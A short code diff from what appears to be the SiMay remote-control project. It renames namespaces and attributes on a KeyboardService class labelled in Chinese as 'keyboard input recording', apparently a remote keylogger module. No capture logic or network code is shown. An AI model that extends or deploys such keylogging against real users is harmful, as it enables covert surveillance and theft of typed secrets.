@@ -1,12 +1,11 @@
 ﻿using SiMay.Core;
 using SiMay.ModelBinder;
 using SiMay.Net.SessionProvider;
-using SiMay.ServiceCore.Attributes;
 
-namespace SiMay.ServiceCore
+namespace SiMay.Service.Core
 {
     [ServiceName("键盘输入记录")]
-    [ApplicationKey(ApplicationKeyConstant.REMOTE_KEYBOARD)]
+    [ApplicationServiceKey(ApplicationKeyConstant.REMOTE_KEYBOARD)]
     public class KeyboardService : ApplicationRemoteService
     {
         private Keyboard _keyboard;
